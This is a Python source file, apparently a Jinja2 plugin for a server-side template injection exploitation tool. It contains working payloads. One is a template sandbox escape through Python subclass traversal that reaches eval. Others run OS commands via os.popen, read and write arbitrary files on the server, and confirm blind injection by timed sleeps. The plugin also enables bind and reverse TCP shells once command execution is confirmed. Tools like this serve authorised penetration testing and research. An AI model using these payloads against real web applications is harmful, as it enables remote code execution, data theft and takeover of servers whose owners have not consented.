from utils.strings import quote
from core.plugin import Plugin
from core import languages
from utils.loggers import log
from utils import rand
import base64
import re

class Jinja2(Plugin):

    actions = {
        'render' : {
            'render': '{{%(code)s}}',
            'header': '{{%(header)s}}',
            'trailer': '{{%(trailer)s}}'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """{%% set d = "%(code)s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
    {%% if 'eval' in b.keys() %%}
    {{ b['eval'](d) }}
    {%% endif %%} {%% endif %%} {%% endfor %%}
    {%% endif %%} {%% endfor %%}"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """__import__('os').popen('%(code)s').read()"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """'a'.join('ab') == 'aab'""",
            'bool_false' : 'True == False'
        },
        'evaluate_blind' : {
            'call': 'evaluate',
            'evaluate_blind': """%(code)s and __import__('time').sleep(%(delay)i)"""
        },
        'tcp_shell' : {
            'call' : 'execute_blind',
            'tcp_shell': languages.bash_tcp_shell
        },
        'reverse_tcp_shell' : {
            'call': 'execute_blind',
            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """{%% set d = "__import__('os').popen('%(code)s && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
    {%% if 'eval' in b.keys() %%}
    {{ b['eval'](d) }}
    {%% endif %%} {%% endif %%} {%% endfor %%}
    {%% endif %%} {%% endfor %%}"""
        },

    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # This covers {{%s}}
        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : languages.python_ctx_closures },

        # This covers {% %s %}
        { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : languages.python_ctx_closures },

        # If and for blocks
        # # if %s:\n# endif
        # # for a in %s:\n# endfor
        { 'level': 5, 'prefix': '%(closure)s\n', 'suffix' : '\n', 'closures' : languages.python_ctx_closures },

        # Comment blocks
        { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },

    ]

    language = 'python'

    def rendered_detected(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        # Check this to avoid detecting Twig as Jinja2
        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.render(payload):

            self.set('engine', self.plugin.lower())
            self.set('language', self.language)

            os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
            if os and re.search('^[\w-]+$', os):
                self.set('os', os)
                self.set('evaluate', self.language)
                self.set('write', True)
                self.set('read', True)

                expected_rand = str(rand.randint_n(2))
                if expected_rand == self.execute('echo %s' % expected_rand):
                    self.set('execute', True)
                    self.set('tcp_shell', True)
                    self.set('reverse_tcp_shell', True)


    def blind_detected(self):

        self.set('engine', self.plugin.lower())
        self.set('language', self.language)

        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('tcp_shell', True)
            self.set('reverse_tcp_shell', True)

    def evaluate(self, code, **kwargs):
        # Quote code before submitting it
        return super(Jinja2, self).evaluate(quote(code), **kwargs)
